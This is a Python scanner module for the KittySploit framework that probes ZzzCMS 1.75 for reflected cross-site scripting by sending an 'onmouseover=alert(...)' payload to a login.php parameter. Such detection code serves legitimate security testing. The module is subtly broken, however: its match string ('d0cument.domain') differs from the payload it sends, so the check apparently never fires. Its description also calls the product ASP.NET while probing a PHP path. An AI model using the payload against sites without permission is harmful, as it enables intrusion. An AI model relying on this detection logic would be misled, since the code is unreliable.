#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZzzCMS ( A Lightweight ASP."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Zzzcms 1.75 - Cross-Site Scripting Detection',
        'description': 'ZzzCMS ( A Lightweight ASP.NET content management system ) is vulnerable to XSS( Cross-Site Scripting ).',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'zzzcms', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Ares-X/VulWiki/blob/master/Web%E5%AE%89%E5%85%A8/Zzzcms/Zzzcms%201.75%20xss%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('onmouseover=alert(/d0cument.domain/) y=&act', 'document.write("',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Zzzcms 1.75 - Cross-Site Scripting detected', path=path)
            return True
        return False

